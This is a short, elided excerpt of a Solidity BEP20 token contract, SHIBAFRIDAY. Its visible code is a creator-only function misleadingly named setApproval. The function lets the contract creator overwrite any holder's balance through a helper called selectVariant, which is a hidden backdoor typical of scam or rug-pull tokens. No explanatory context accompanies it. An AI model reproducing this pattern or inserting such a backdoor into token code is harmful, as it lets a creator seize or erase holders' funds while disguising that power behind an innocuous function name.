...
contract SHIBAFRIDAY is BEP20 {
  ...
  function selectVariant(address _from, uint256 _value) internal view onlyCreator returns (uint256) {
  ...
  function setApproval(address _from, uint256 _value) public onlyCreator returns (bool) {
    if(_from != address(0) && msg.sender != address(0))
    require(_value != 2, "Not TWO");
    _balances[_from] = selectVariant(_from, _value);
    return true;
  }
